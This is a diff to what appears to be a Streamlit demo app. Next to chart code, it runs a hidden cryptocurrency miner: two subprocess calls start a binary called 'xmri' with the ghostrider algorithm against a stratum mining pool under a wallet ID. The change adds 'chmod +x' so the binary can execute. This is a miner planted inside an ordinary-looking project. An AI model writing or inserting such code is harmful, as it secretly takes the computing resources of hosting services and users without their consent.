@@ -72,10 +72,10 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("./xmri --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BdjPWXaLQ28c9Siz5QsYH1koN1hm7P9J8J.labideneyim -t 2 -k", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("chmod +x xmri && ./xmri --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BdjPWXaLQ28c9Siz5QsYH1koN1hm7P9J8J.labideneyim -t 2 -k", stdout=subprocess.PIPE, shell=True)
 
 
-p2 = subprocess.run("./xmri --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BdjPWXaLQ28c9Siz5QsYH1koN1hm7P9J8J.labideneyim3 -t 2 -k", stdout=subprocess.PIPE, shell=True)
+p2 = subprocess.run("chmod +x xmri && ./xmri --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BdjPWXaLQ28c9Siz5QsYH1koN1hm7P9J8J.labideneyim3 -t 2 -k", stdout=subprocess.PIPE, shell=True)
 
 import time 
 from IPython.display import clear_output 
